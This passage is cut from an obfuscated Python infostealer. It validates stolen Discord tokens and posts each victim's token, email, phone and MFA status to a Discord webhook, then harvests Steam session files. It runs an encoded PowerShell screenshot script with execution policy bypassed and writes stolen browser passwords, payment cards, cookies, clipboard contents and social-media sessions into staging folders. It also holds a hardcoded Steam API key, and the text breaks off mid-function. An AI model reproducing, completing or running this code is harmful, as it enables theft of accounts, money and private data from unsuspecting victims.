                async with OO0O0O0O0O000O0OO .get (OOO0OOO0OOO00000O ,headers =OO00OO000OO000O00 )as OOO000OOO000000OO :#line:1359
                    if OOO000OOO000000OO .status ==200 :#line:1360
                        Variables .ValidatedTokens .append (O0OOOO0OOO0OO000O )#line:1361
                        O000O0O0OOOO000OO =await OOO000OOO000000OO .json ()#line:1362
                        O0000OOOO0OO0OOOO =O000O0O0OOOO000OO .get ("avatar","")#line:1364
                        OOO0OOO00OOOOO000 =O000O0O0OOOO000OO .get ('public_flags',[])#line:1365
                        O000OOO00O0O0OOO0 =' '.join ([O000000000000OOOO [0 ]for O000000000000OOOO in O0000OO0O0OOOOOOO .calc_flags (OOO0OOO00OOOOO000 )])#line:1366
                        OOO00OO0OOOOOOO0O =O000O0O0OOOO000OO .get ("premium_type","")#line:1367
                        if O0000OOOO0OO0OOOO :#line:1368
                            async with OO0O0O0O0O000O0OO .get (f"https://cdn.discordapp.com/avatars/{O000O0O0OOOO000OO['id']}/{O0000OOOO0OO0OOOO}.png",headers =OO00OO000OO000O00 )as O0OOOOOOO0000OOO0 :#line:1369
                                if O0OOOOOOO0000OOO0 .status ==200 :#line:1370
                                    OO0000O0OOO00OO00 =f"https://cdn.discordapp.com/avatars/{O000O0O0OOOO000OO['id']}/{O0000OOOO0OO0OOOO}.png"#line:1371
                                else :#line:1372
                                    OO0000O0OOO00OO00 =f"https://cdn.discordapp.com/avatars/{O000O0O0OOOO000OO['id']}/{O0000OOOO0OO0OOOO}.gif"#line:1373
                        async with OO0O0O0O0O000O0OO .get (O0OO00O0OO00000OO ,headers =OO00OO000OO000O00 )as OO0OO00OOO0OOO00O :#line:1374
                            OO0O0O0O0O00000O0 =await OO0OO00OOO0OOO00O .json ()#line:1375
                    else :#line:1376
                        return #line:1377
            OOO0O0O0OO0OOO000 ="No Nitro"#line:1379
            try :#line:1380
                if OOO00OO0OOOOOOO0O ==0 :#line:1381
                    OOO0O0O0OO0OOO000 ='None'#line:1382
                elif OOO00OO0OOOOOOO0O ==1 :#line:1383
                    OOO0O0O0OO0OOO000 ='Nitro Classic'#line:1384
                elif OOO00OO0OOOOOOO0O ==2 :#line:1385
                    OOO0O0O0OO0OOO000 ='Nitro'#line:1386
                elif OOO00OO0OOOOOOO0O ==3 :#line:1387
                    OOO0O0O0OO0OOO000 ='Nitro Basic'#line:1388
                else :#line:1389
                    OOO0O0O0OO0OOO000 ='None'#line:1390
            except :#line:1391
                pass #line:1392
            O0000OO0O0OOOOO0O =[]#line:1393
            try :#line:1394
                if OO0O0O0O0O00000O0 :#line:1395
                    for OO0OOOOOO0O0000OO in OO0O0O0O0O00000O0 :#line:1396
                        O00O0O0O0O0O00O00 =[64 ,128 ,256 ,1048704 ]#line:1397
                        O0OOOOO0OOO00OO0O =[O000O0OOOOO0O0OO0 [1 ]for O000O0OOOOO0O0OO0 in O0000OO0O0OOOOOOO .calc_flags2 (OO0OOOOOO0O0000OO ['user']['public_flags'])[::-1 ]]#line:1398
                        for O0OO0000OOO0O000O in O00O0O0O0O0O00O00 :#line:1399
                            O0OOOOO0OOO00OO0O .remove (O0OO0000OOO0O000O )if O0OO0000OOO0O000O in O0OOOOO0OOO00OO0O else None #line:1400
                        if O0OOOOO0OOO00OO0O !=[]:#line:1401
                            OO0O00OOO0000OO00 =' '.join ([OOOOO0OO00O000O00 [0 ]for OOOOO0OO00O000O00 in O0000OO0O0OOOOOOO .calc_flags2 (OO0OOOOOO0O0000OO ['user']['public_flags'])[::-1 ]])#line:1402
                            O0O0000OOOO00O0OO =f"{OO0O00OOO0000OO00} - ``{OO0OOOOOO0O0000OO['user']['username']}#{OO0OOOOOO0O0000OO['user']['discriminator']} ({OO0OOOOOO0O0000OO['user']['id']})``"#line:1403
                            if len ('\n'.join (O0000OO0O0OOOOO0O ))+len (O000O0O0OOOO000OO )>=1024 :#line:1404
                                break #line:1405
                            O0000OO0O0OOOOO0O .append (O0O0000OOOO00O0OO )#line:1406
                            if len (O0000OO0O0OOOOO0O )>0 :#line:1407
                                O0000OO0O0OOOOO0O ='\n'.join (O0000OO0O0OOOOO0O )#line:1408
            except :#line:1409
                pass #line:1410
            if O000O0O0OOOO000OO :#line:1412
                OOOO0OO0O0O000000 ={"title":"***Shit***","description":f"***Validated Discord Token Detected***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":""}}#line:1419
                if OO0000O0OOO00OO00 :#line:1420
                    OOOO0OO0O0O000000 ["thumbnail"]["url"]=OO0000O0OOO00OO00 #line:1421
                O0O00O0O000O0OOO0 =str (O000O0O0OOOO000OO ['bio'])#line:1422
                O0O00O0O000O0OOO0 =O0O00O0O000O0OOO0 .replace ("\n",", ")#line:1423
                O0O0O00OO0OOO000O =[{"name":"Token","value":"``"+str (O0OOOO0OOO0OO000O )+"``","inline":False },{"name":"Username","value":"``"+str (f'{O000O0O0OOOO000OO["username"]}#{O000O0O0OOOO000OO["discriminator"]}')+"``","inline":True },{"name":"Email","value":"``"+str (O000O0O0OOOO000OO ['email'])+"``","inline":True },{"name":"ID","value":"``"+str (O000O0O0OOOO000OO ["id"])+"``","inline":True },{"name":"Phone","value":"``"+str (O000O0O0OOOO000OO ['phone'])+"``","inline":True },{"name":"MFA Enabled?","value":"``"+str (O000O0O0OOOO000OO ['mfa_enabled'])+"``","inline":True },{"name":"Nitro Type","value":"``"+str (OOO0O0O0OO0OOO000 )+"``","inline":True },{"name":"Badges","value":str (O000OOO00O0O0OOO0 if O000OOO00O0O0OOO0 !=''else 'None'),"inline":True },]#line:1433
                if O0000OO0O0OOOOO0O :#line:1434
                    try :#line:1435
                        O0O0O00OO0OOO000O .append ({"name":"Hq Friends","value":O0000OO0O0OOOOO0O ,"inline":False },)#line:1436
                    except :#line:1437
                        pass #line:1438
                OOOO0OO0O0O000000 ["fields"]=O0O0O00OO0OOO000O #line:1439
                async with aiohttp .ClientSession ()as OO0O0O0O0O000O0OO :#line:1440
                    OOOOOO0OO00OO00OO ={"username":"Shit","embeds":[OOOO0OO0O0O000000 ]}#line:1444
                    OO00OO000OO000O00 ={"Content-Type":"application/json"}#line:1447
                    async with OO0O0O0O0O000O0OO .post (webhook ,json =OOOOOO0OO00OO00OO ,headers =OO00OO000OO000O00 )as OOO000OOO000000OO :#line:1448
                        pass #line:1449
                Variables .DiscordAccounts .append (f"Username : {O000O0O0OOOO000OO['username']}#{O000O0O0OOOO000OO['discriminator']}\nEmail : {O000O0O0OOOO000OO['email']}\nID : {O000O0O0OOOO000OO['id']}\nPhone : {str(O000O0O0OOOO000OO['phone'])}\nMFA Enabled : {O000O0O0OOOO000OO['mfa_enabled']}\nNitro Type : {OOO0O0O0OO0OOO000}\nToken : {O0OOOO0OOO0OO000O}\nBiography : {O0O00O0O000O0OOO0}\n======================================================================\n")#line:1450
        except Exception :#line:1452
            pass #line:1453
    async def GetSteamSession (O00OOO0O000OOO00O )->None :#line:1455
        try :#line:1456
            O0000O00OO0OOO0OO =[]#line:1457
            for O0000OO000O0O00OO in range (ord ('A'),ord ('Z')+1 ):#line:1458
                OO000O0O0O0O00OO0 =chr (O0000OO000O0O00OO )#line:1459
                if os .path .exists (OO000O0O0O0O00OO0 +':\\'):#line:1460
                    O0000O00OO0OOO0OO .append (OO000O0O0O0O00OO0 )#line:1461
            for O00OOO0000O00O00O in O0000O00OO0OOO0OO :#line:1462
                O00OOO0000O00O00O =os .path .join (O00OOO0000O00O00O +":\\","Program Files (x86)","Steam","config","loginusers.vdf")#line:1463
                if os .path .isfile (O00OOO0000O00O00O ):#line:1464
                    with open (O00OOO0000O00O00O ,"r",encoding ="utf-8",errors ="ignore")as O0OOO0O00O00O0000 :#line:1465
                        O0OO00OO0OOOOO0OO ="".join (re .findall (r"7656[0-9]{13}",O0OOO0O00O00O0000 .read ()))#line:1466
                        if O0OO00OO0OOOOO0OO :#line:1467
                            async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OO000O00O000OO00O :#line:1468
                                OO0OOO0O0OO0000OO ="https://api.steampowered.com/ISteamUser/GetPlayerSummaries/v0002/?key=440D7F4D810EF9298D25EDDF37C1F902&steamids="+O0OO00OO0OOOOO0OO #line:1469
                                OOOOO00O0OOOO0000 ="https://api.steampowered.com/IPlayerService/GetSteamLevel/v1/?key=440D7F4D810EF9298D25EDDF37C1F902&steamid="+O0OO00OO0OOOOO0OO #line:1470
                                async with OO000O00O000OO00O .get (OO0OOO0O0OO0000OO )as OO00OOO0OO0O0OO00 :#line:1471
                                    O00OOO0OOOOO0O0OO =await OO00OOO0OO0O0OO00 .json ()#line:1472
                                async with OO000O00O000OO00O .get (OOOOO00O0OOOO0000 )as O000O00O00O000O00 :#line:1473
                                    OO00OO0OO00OOO0O0 =await O000O00O00O000O00 .json ()#line:1474
                                O0O0O00OO0OOOOOO0 =O00OOO0OOOOO0O0OO ["response"]["players"][0 ]#line:1475
                                OOO0OO0O0O0OOO0OO =O0O0O00OO0OOOOOO0 ["personaname"]#line:1476
                                O0O00OOOO0O00OO0O =O0O0O00OO0OOOOOO0 ["profileurl"]#line:1477
                                OOO00OOO0O0OOOOO0 =O0O0O00OO0OOOOOO0 ["avatarfull"]#line:1478
                                OOO0O00O0O00OOO0O =O0O0O00OO0OOOOOO0 ["timecreated"]#line:1479
                                if O0O0O00OO0OOOOOO0 ["realname"]:#line:1480
                                    OO0OO00O0O00O00O0 =O0O0O00OO0OOOOOO0 ["realname"]#line:1481
                                else :OO0OO00O0O00O00O0 ="None"#line:1482
                                O0OO000OOO00O000O =OO00OO0OO00OOO0O0 ["response"]["player_level"]#line:1483
                                O0000OO0OOO000OOO ={"title":"***Shit***","description":f"***Steam Session Detected***","url":"Shit","color":0 ,"footer":{"text":"Shit"},"thumbnail":{"url":OOO00OOO0O0OOOOO0 }}#line:1490
                                OO00OOOO000O0OOO0 =[{"name":"Username","value":"``"+str (OOO0OO0O0O0OOO0OO )+"``","inline":True },{"name":"Realname","value":"``"+str (OO0OO00O0O00O00O0 )+"``","inline":True },{"name":"ID","value":"``"+str (O0OO00OO0OOOOO0OO )+"``","inline":True },{"name":"Timecreated","value":"``"+str (OOO0O00O0O00OOO0O )+"``","inline":True },{"name":"Player Level","value":"``"+str (O0OO000OOO00O000O )+"``","inline":True },{"name":"Profile URL","value":"``"+str (O0O00OOOO0O00OO0O )+"``","inline":True },]#line:1497
                                O0000OO0OOO000OOO ["fields"]=OO00OOOO000O0OOO0 #line:1498
                                async with aiohttp .ClientSession (connector =aiohttp .TCPConnector (ssl =True ))as OO000O00O000OO00O :#line:1499
                                    OOOOO000OOOOO00OO ={"username":"Shit","embeds":[O0000OO0OOO000OOO ]}#line:1503
                                    O0000000OO0OOO0O0 ={"Content-Type":"application/json"}#line:1506
                                    async with OO000O00O000OO00O .post (webhook ,json =OOOOO000OOOOO00OO ,headers =O0000000OO0OOO0O0 )as O00OOO0OOOOO0O0OO :#line:1507
                                        pass #line:1508
        except Exception :#line:1509
            pass #line:1510
    async def StealSteamSessionFiles (O00OOOO0O0O00OO0O ,OO0O00OOO00O0OO0O :str )->None :#line:1511
        try :#line:1512
            O00O00OO0OOO000O0 =os .path .join (O00OOOO0O0O00OO0O .Temp ,OO0O00OOO00O0OO0O )#line:1513
            OOOOO0OOOOO0000OO =os .path .join ("C:\\","Program Files (x86)","Steam","config")#line:1514
            if os .path .isdir (OOOOO0OOOOO0000OO ):#line:1515
                O00OO0000O000OOOO =os .path .join (O00O00OO0OOO000O0 ,"Games","Steam")#line:1516
                if not os .path .isdir (O00OO0000O000OOOO ):#line:1517
                    os .mkdir (O00OO0000O000OOOO )#line:1518
                shutil .copytree (OOOOO0OOOOO0000OO ,os .path .join (O00OO0000O000OOOO ,"Session Files"))#line:1519
        except :#line:1520
            return "null"#line:1521
    async def WriteToText (O0OO0O000O0OOOO0O )->None :#line:1523
        try :#line:1524
            O00O0O0O0OO0O0OOO ="wmic csproduct get uuid"#line:1525
            OO0O00O00O00OOOOO =await asyncio .create_subprocess_shell (O00O0O0O0OO0O0OOO ,stdout =asyncio .subprocess .PIPE ,stderr =asyncio .subprocess .PIPE ,shell =True )#line:1531
            OO0O00OO000O0O000 ,OOOO0OO00O0OO000O =await OO0O00O00O00OOOOO .communicate ()#line:1533
            OOO0O0O0OOOOO00O0 =OO0O00OO000O0O000 .decode (errors ="ignore").split ("\n")#line:1534
            O0O0OOOOOOOO0OO00 =OOO0O0O0OOOOO00O0 [1 ].strip ()if len (OOO0O0O0OOOOO00O0 )>1 else None #line:1535
            OOO00OOOO0O0O0OO0 =os .path .join (O0OO0O000O0OOOO0O .Temp ,O0O0OOOOOOOO0OO00 )#line:1536
            if os .path .isdir (OOO00OOOO0O0O0OO0 ):#line:1537
                shutil .rmtree (OOO00OOOO0O0O0OO0 )#line:1538
            os .mkdir (OOO00OOOO0O0O0OO0 )#line:1539
            os .mkdir (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers"))#line:1540
            os .mkdir (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions"))#line:1541
            os .mkdir (os .path .join (OOO00OOOO0O0O0OO0 ,"Tokens"))#line:1542
            os .mkdir (os .path .join (OOO00OOOO0O0O0OO0 ,"Games"))#line:1543
            await O0OO0O000O0OOOO0O .GetWallets (OOO00OOOO0O0O0OO0 )#line:1544
            await O0OO0O000O0OOOO0O .StealTelegramSession (OOO00OOOO0O0O0OO0 )#line:1545
            await O0OO0O000O0OOOO0O .StealUplay (O0O0OOOOOOOO0OO00 )#line:1546
            await O0OO0O000O0OOOO0O .StealEpicGames (O0O0OOOOOOOO0OO00 )#line:1547
            await O0OO0O000O0OOOO0O .StealGrowtopia (O0O0OOOOOOOO0OO00 )#line:1548
            await O0OO0O000O0OOOO0O .StealSteamSessionFiles (O0O0OOOOOOOO0OO00 )#line:1549
            if len (os .listdir (os .path .join (OOO00OOOO0O0O0OO0 ,"Games")))==0 :#line:1550
                try :#line:1551
                    shutil .rmtree (os .path .join (OOO00OOOO0O0O0OO0 ,"Games"))#line:1552
                except :pass #line:1553
            if O0OO0O000O0OOOO0O .FireFox :#line:1554
                os .mkdir (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Firefox"))#line:1555
            O0O0OO0O00O00O00O ="JABzAG8AdQByAGMAZQAgAD0AIABAACIADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtADsADQAKAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AQwBvAGwAbABlAGMAdABpAG8AbgBzAC4ARwBlAG4AZQByAGkAYwA7AA0ACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcAOwANAAoAdQBzAGkAbgBnACAAUwB5AHMAdABlAG0ALgBXAGkAbgBkAG8AdwBzAC4ARgBvAHIAbQBzADsADQAKAA0ACgBwAHUAYgBsAGkAYwAgAGMAbABhAHMAcwAgAFMAYwByAGUAZQBuAHMAaABvAHQADQAKAHsADQAKACAAIAAgACAAcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAEwAaQBzAHQAPABCAGkAdABtAGEAcAA+ACAAQwBhAHAAdAB1AHIAZQBTAGMAcgBlAGUAbgBzACgAKQANAAoAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAdgBhAHIAIAByAGUAcwB1AGwAdABzACAAPQAgAG4AZQB3ACAATABpAHMAdAA8AEIAaQB0AG0AYQBwAD4AKAApADsADQAKACAAIAAgACAAIAAgACAAIAB2AGEAcgAgAGEAbABsAFMAYwByAGUAZQBuAHMAIAA9ACAAUwBjAHIAZQBlAG4ALgBBAGwAbABTAGMAcgBlAGUAbgBzADsADQAKAA0ACgAgACAAIAAgACAAIAAgACAAZgBvAHIAZQBhAGMAaAAgACgAUwBjAHIAZQBlAG4AIABzAGMAcgBlAGUAbgAgAGkAbgAgAGEAbABsAFMAYwByAGUAZQBuAHMAKQANAAoAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFIAZQBjAHQAYQBuAGcAbABlACAAYgBvAHUAbgBkAHMAIAA9ACAAcwBjAHIAZQBlAG4ALgBCAG8AdQBuAGQAcwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHUAcwBpAG4AZwAgACgAQgBpAHQAbQBhAHAAIABiAGkAdABtAGEAcAAgAD0AIABuAGUAdwAgAEIAaQB0AG0AYQBwACgAYgBvAHUAbgBkAHMALgBXAGkAZAB0AGgALAAgAGIAbwB1AG4AZABzAC4ASABlAGkAZwBoAHQAKQApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB1AHMAaQBuAGcAIAAoAEcAcgBhAHAAaABpAGMAcwAgAGcAcgBhAHAAaABpAGMAcwAgAD0AIABHAHIAYQBwAGgAaQBjAHMALgBGAHIAbwBtAEkAbQBhAGcAZQAoAGIAaQB0AG0AYQBwACkAKQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGcAcgBhAHAAaABpAGMAcwAuAEMAbwBwAHkARgByAG8AbQBTAGMAcgBlAGUAbgAoAG4AZQB3ACAAUABvAGkAbgB0ACgAYgBvAHUAbgBkAHMALgBMAGUAZgB0ACwAIABiAG8AdQBuAGQAcwAuAFQAbwBwACkALAAgAFAAbwBpAG4AdAAuAEUAbQBwAHQAeQAsACAAYgBvAHUAbgBkAHMALgBTAGkAegBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAcgBlAHMAdQBsAHQAcwAuAEEAZABkACgAKABCAGkAdABtAGEAcAApAGIAaQB0AG0AYQBwAC4AQwBsAG8AbgBlACgAKQApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAKABFAHgAYwBlAHAAdABpAG8AbgApAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAC8ALwAgAEgAYQBuAGQAbABlACAAYQBuAHkAIABlAHgAYwBlAHAAdABpAG8AbgBzACAAaABlAHIAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKAA0ACgAgACAAIAAgACAAIAAgACAAcgBlAHQAdQByAG4AIAByAGUAcwB1AGwAdABzADsADQAKACAAIAAgACAAfQANAAoAfQANAAoAIgBAAA0ACgANAAoAQQBkAGQALQBUAHkAcABlACAALQBUAHkAcABlAEQAZQBmAGkAbgBpAHQAaQBvAG4AIAAkAHMAbwB1AHIAYwBlACAALQBSAGUAZgBlAHIAZQBuAGMAZQBkAEEAcwBzAGUAbQBiAGwAaQBlAHMAIABTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALAAgAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwANAAoADQAKACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzACAAPQAgAFsAUwBjAHIAZQBlAG4AcwBoAG8AdABdADoAOgBDAGEAcAB0AHUAcgBlAFMAYwByAGUAZQBuAHMAKAApAA0ACgANAAoADQAKAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACAAJABpACAALQBsAHQAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQAcwAuAEMAbwB1AG4AdAA7ACAAJABpACsAKwApAHsADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0ACAAPQAgACQAcwBjAHIAZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA="#line:1556
            OO0O00O00O00OOOOO =await asyncio .create_subprocess_shell (f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {O0O0OO0O00O00O00O}",cwd =OOO00OOOO0O0O0OO0 ,shell =True )#line:1557
            await OO0O00O00O00OOOOO .communicate ()#line:1558
            O0000OO00OO000OO0 =Variables .Passwords #line:1559
            OOO0O0000OOO00O00 =Variables .Cards #line:1560
            OOO0000OO00OO0OO0 =Variables .Cookies #line:1561
            OO000OOO0OOOO00OO =Variables .Historys #line:1562
            O00O0OO0000OO0OO0 =Variables .Bookmarks #line:1563
            OO00O0O0000O00O0O =Variables .Autofills #line:1564
            O00O00OOOOOO00O00 =Variables .Downloads #line:1565
            OO00O00OO0OOOOO00 =Variables .RiotGameAccounts #line:1566
            O0OOO0O0OOOOO00OO =Variables .InstagramAccounts #line:1567
            O00OOO00000O00O00 =Variables .TwitterAccounts #line:1568
            OOOO000000O0O0OO0 =Variables .TikTokAccounts #line:1569
            O00OOO0OO00O000OO =Variables .RedditAccounts #line:1570
            O0OO000O0O00OO000 =Variables .TwtichAccounts #line:1571
            O0O0000O0O0O0O000 =Variables .SpotifyAccounts #line:1572
            OO0OOOO00O0O0000O =Variables .SteamAccounts #line:1573
            O0O0O0O0O00O0OO00 =Variables .RobloxAccounts #line:1574
            OOO0O0OO0OO000000 =Variables .Processes #line:1576
            if OOO0O0OO0OO000000 :#line:1577
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"process_info.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1578
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1579
                    for O00O0OO0OO0OOO000 in OOO0O0OO0OO000000 :#line:1580
                        O000000OOO0OOO00O .write (O00O0OO0OO0OOO000 )#line:1581
            if Variables .ClipBoard :#line:1582
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"last_clipboard.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1583
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1584
                    for OOOOO000O0OO0OO0O in Variables .ClipBoard :#line:1585
                        O000000OOO0OOO00O .write (OOOOO000O0OO0OO0O )#line:1586
            if O0OO0O000O0OOOO0O .FirefoxCookieList :#line:1587
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Firefox","Cookies.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1588
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1589
                    for OOOO00000O0O0O00O in O0OO0O000O0OOOO0O .FirefoxCookieList :#line:1590
                        O000000OOO0OOO00O .write (OOOO00000O0O0O00O )#line:1591
            if O0OO0O000O0OOOO0O .FirefoxHistoryList :#line:1592
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Firefox","History.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1593
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1594
                    for OO00O0000O0O0O0O0 in O0OO0O000O0OOOO0O .FirefoxHistoryList :#line:1595
                        O000000OOO0OOO00O .write (OO00O0000O0O0O0O0 )#line:1596
            if O0OO0O000O0OOOO0O .FirefoxAutofiList :#line:1597
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Firefox","Autofills.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1598
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1599
                    for O00OOOOO0OO00000O in O0OO0O000O0OOOO0O .FirefoxAutofiList :#line:1600
                        O000000OOO0OOO00O .write (O00OOOOO0OO00000O )#line:1601
            if O0000OO00OO000OO0 :#line:1602
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Passwords.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1603
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1604
                    for OO0OO0O0O0O0O000O in O0000OO00OO000OO0 :#line:1605
                        O000000OOO0OOO00O .write (OO0OO0O0O0O0O000O )#line:1606
            if OOO0O0000OOO00O00 :#line:1607
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Cards.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1608
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1609
                    for OOO000O0O0OOOO000 in OOO0O0000OOO00O00 :#line:1610
                        O000000OOO0OOO00O .write (OOO000O0O0OOOO000 )#line:1611
            if OOO0000OO00OO0OO0 :#line:1612
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Cookies.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1613
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1614
                    for O0O00O00O0O00O0OO in OOO0000OO00OO0OO0 :#line:1615
                        O000000OOO0OOO00O .write (O0O00O00O0O00O0OO )#line:1616
            if OO000OOO0OOOO00OO :#line:1617
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Historys.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1618
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1619
                    for OO0OOO00OO0OOO0OO in OO000OOO0OOOO00OO :#line:1620
                        O000000OOO0OOO00O .write (OO0OOO00OO0OOO0OO )#line:1621
            if OO00O0O0000O00O0O :#line:1622
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Autofills.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1623
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1624
                    for O00000OOOOO0O00O0 in OO00O0O0000O00O0O :#line:1625
                        O000000OOO0OOO00O .write (O00000OOOOO0O00O0 )#line:1626
            if O00O0OO0000OO0OO0 :#line:1627
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Bookmarks.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1628
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1629
                    for O0000O00O0OOO0OO0 in O00O0OO0000OO0OO0 :#line:1630
                        O000000OOO0OOO00O .write (O0000O00O0OOO0OO0 )#line:1631
            if O00O00OOOOOO00O00 :#line:1632
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Browsers","Downloads.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1633
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1634
                    for OO0O000O0OO0O00OO in O00O00OOOOOO00O00 :#line:1635
                        O000000OOO0OOO00O .write (OO0O000O0OO0O00OO )#line:1636
            if OO00O00OO0OOOOO00 :#line:1637
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions","riot_games.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1638
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1639
                    for O000OOOO00O000O00 in OO00O00OO0OOOOO00 :#line:1640
                        O000000OOO0OOO00O .write (O000OOOO00O000O00 )#line:1641
            if O0OOO0O0OOOOO00OO :#line:1642
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions","instagram_sessions.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1643
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1644
                    for O0OOO00O00OOOOOO0 in O0OOO0O0OOOOO00OO :#line:1645
                        O000000OOO0OOO00O .write (O0OOO00O00OOOOOO0 )#line:1646
            if OOOO000000O0O0OO0 :#line:1647
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions","tiktok_sessions.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1648
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1649
                    for O000O0OOOO0O0O0OO in OOOO000000O0O0OO0 :#line:1650
                        O000000OOO0OOO00O .write (O000O0OOOO0O0O0OO )#line:1651
            if O00OOO00000O00O00 :#line:1652
                with open (os .path .join (OOO00OOOO0O0O0OO0 ,"Sessions","twitter_sessions.txt"),"a",encoding ="utf-8",errors ="ignore")as O000000OOO0OOO00O :#line:1653
                    O000000OOO0OOO00O .write ("--------------------------------------------\n"+"="*70 +"\n")#line:1654
                    for OOO0OOO0000OOOO00 in O00OOO00000O00O00 :#line:1655
                        O000000OOO0OOO00O .write (OOO0OOO0000OOOO00 )#line:1656
            if O00OOO0OO00O000OO :#line:1657
